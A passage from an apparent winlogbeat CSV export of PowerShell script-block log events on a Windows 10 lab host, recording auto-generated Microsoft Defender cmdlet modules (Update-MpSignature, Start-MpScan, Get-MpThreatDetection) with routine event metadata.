    [Parameter(ParameterSetName='Update0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('UpdateSource')) {
          [object]$__cmdletization_value = ${UpdateSource}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UpdateSource'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UpdateSource'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Update', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpSignature.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Update-MpSignature' -Alias '*'
        


ScriptBlock ID: 80512a37-7439-424a-ba80-50297b0882cb
Path: ","80512a37-7439-424a-ba80-50297b0882cb","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpSignature'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Update-MpSignature
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Update0')]
    [AllowEmptyString()]
    [AllowNull()]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('InternalDefinitionUpdateServer','MicrosoftUpdateServer','MMPC','FileShares')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource]
    ${UpdateSource},

    [Parameter(ParameterSetName='Update0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Update0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Update0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('UpdateSource')) {
          [object]$__cmdletization_value = ${UpdateSource}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UpdateSource'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UpdateSource'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpSignature.UpdateSource'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Update', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpSignature.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Update-MpSignature' -Alias '*'
        ",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-06d3-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3354,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.432",fXkSBIQByII7dpeEjBwK,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:35.659","Oct 23, 2022 @ 17:00:35.204",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpScan'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Start-MpScan
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Start0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${ScanPath},

    [Parameter(ParameterSetName='Start0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('FullScan','QuickScan','CustomScan')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType]
    ${ScanType},

    [Parameter(ParameterSetName='Start0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Start0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Start0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanPath')) {
          [object]$__cmdletization_value = ${ScanPath}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanType')) {
          [object]$__cmdletization_value = ${ScanType}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpScan.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Start-MpScan' -Alias '*'
        


ScriptBlock ID: 883751ec-7772-4538-a5fb-0262d1168d83
Path: ","883751ec-7772-4538-a5fb-0262d1168d83","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpScan'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Start-MpScan
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Start0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [string]
    ${ScanPath},

    [Parameter(ParameterSetName='Start0')]
    [ValidateNotNull()]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('FullScan','QuickScan','CustomScan')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType]
    ${ScanType},

    [Parameter(ParameterSetName='Start0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Start0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Start0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanPath')) {
          [object]$__cmdletization_value = ${ScanPath}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ScanType')) {
          [object]$__cmdletization_value = ${ScanType}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpScan.ScanType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Start', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpScan.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Start-MpScan' -Alias '*'
        ",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-03d3-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3353,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.398",dXkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.649","Oct 23, 2022 @ 17:00:34.214",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpThreatDetection'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-MpThreatDetection
{
    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\Microsoft\Windows\Defender\MSFT_MpThreatDetection')]

    param(
    
    [Parameter(ParameterSetName='ById')]
    [Alias('ID')]
    [ValidateNotNull()]
    [long[]]
    ${ThreatID},

    [Parameter(ParameterSetName='ById')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ById')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ById')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ThreatID})
        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP MSFT_MpThreatDetection.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-MpThreatDetection' -Alias '*'
        


ScriptBlock ID: c7dd09d8-b654-4794-a6dc-ece9c872c0ee
Path: ","c7dd09d8-b654-4794-a6dc-ece9c872c0ee","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT\Microsoft\Windows\Defender\MSFT_MpThreatDetection'
$script:ClassVersion = '1.0'
$script:ModuleVersion = '1.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-MpThreatDetection
{
    [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT\Microsoft\Windows\Defender\MSFT_MpThreatDetection')]

    param(
    
    [Parameter(ParameterSetName='ById')]
    [Alias('ID')]
    [ValidateNotNull()]
    [long[]]
    ${ThreatID},

    [Parameter(ParameterSetName='ById')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ById')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ById')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('ThreatID') -and (@('ById') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ThreatID})
        $__cmdletization_queryBuilder.FilterByProperty('ThreatID', $__cmdletization_values, $false, 'Default')
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        
